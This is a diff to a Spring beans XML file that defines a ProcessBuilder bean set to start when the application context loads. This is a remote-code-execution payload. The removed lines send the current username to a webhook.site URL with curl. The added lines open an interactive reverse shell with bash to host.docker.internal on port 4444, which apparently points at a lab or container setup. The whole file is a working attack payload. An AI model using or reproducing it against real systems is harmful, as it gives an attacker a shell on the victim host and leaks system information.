@@ -1,16 +1,15 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<beans xmlns="http://www.springframework.org/schema/beans"
+<?xml version="1.0" encoding="UTF-8" ?>
+    <beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="http://www.springframework.org/schema/beans 
-           http://www.springframework.org/schema/beans/spring-beans.xsd">
-
-    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-        <constructor-arg>
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg>
             <list>
-                <value>sh</value>
+                <value>bash</value>
                 <value>-c</value>
-                <value>curl https://webhook.site/9eff54fa-9345-4552-a206-e43abc304e57/$(whoami)</value>
+                <value><![CDATA[bash -i >& /dev/tcp/host.docker.internal/4444 0>&1]]></value>
             </list>
-        </constructor-arg>
-    </bean>
-</beans>
+            </constructor-arg>
+        </bean>
+    </beans>
